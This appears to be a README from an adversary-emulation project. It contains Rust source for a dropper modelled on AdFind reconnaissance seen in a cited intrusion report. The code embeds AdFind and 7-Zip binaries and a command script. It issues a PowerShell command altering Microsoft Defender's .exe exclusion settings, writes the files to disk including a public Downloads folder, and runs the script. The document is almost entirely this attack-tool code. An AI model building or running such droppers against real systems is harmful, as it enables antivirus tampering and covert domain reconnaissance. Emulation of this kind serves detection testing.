# Adfind
ref: https://thedfirreport.com/2020/05/08/adfind-recon/

Version  debug V0 :)
Code:
```rust
fn main() {
    let dropzone = r"C:\Users\Public\Downloads\";

    //Adfind tools
    let adfind_bin = include_bytes!("payload/AdFind.bin");
    let adfind_cmd = include_str!("payload/adfind.cmd");
    
    //7zip
    let  sevenzip_a = include_bytes!("payload/7zip/7za.dll");
    let  sevenzip_xa = include_bytes!("payload/7zip/7zxa.dll");
    let  sevenzip_exe = include_bytes!("payload/7zip/7za.exe");

    // exclude exe from defender
    tools::run_exe("powershell", "Remove-MpPreference -ExclusionExtension .exe");
    
    //let make a scope to close the file :)
    {
        File::create("find.exe").expect("Oups").write_all(adfind_bin).unwrap();
        File::create("check.cmd").expect("Oups").write_all( adfind_cmd.as_bytes()).unwrap();
        File::create("7za.dll").expect("Oups").write_all(sevenzip_a).unwrap();
        File::create("7zxa.dll").expect("Oups").write_all(sevenzip_xa).unwrap();
        File::create(concat!(dropzone,"7za.exe")).expect("Oups").write_all(sevenzip_exe).unwrap();
    }

    tools::run_exe("cmd", "/C check.cmd")
}
```